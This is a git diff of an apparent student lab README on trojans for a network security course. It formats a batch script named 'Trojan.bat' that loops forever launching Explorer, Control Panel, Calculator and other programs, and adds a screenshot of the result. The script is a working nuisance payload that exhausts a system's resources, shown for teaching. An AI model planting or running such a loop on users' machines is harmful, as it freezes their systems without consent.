@@ -27,6 +27,7 @@ information, passwords, or personal identity.
   Example: Ransomware attacks are often carried out using a trojan. 
 
 # CODE: 
+```
 Trojan.bat 
 @echo off 
 :x 
@@ -37,9 +38,11 @@ start explorer
 start control 
 start calc 
 goto x 
- 
+ ```
 # OUTPUT 
-          (MS-Paint, Notepad, Command Prompt, Explorer will open infinitely)
+          
+<img width="343" alt="Screenshot 2024-04-27 083145" src="https://github.com/Prasanna-CSE/EX-05_CNS/assets/119102676/1349f04d-eb43-44d5-aaf0-49762fbec047">
+
 
 # RESULT:
   Thus a Trojan was built and the harmness of the trojan malwares in a computer system is Known.  
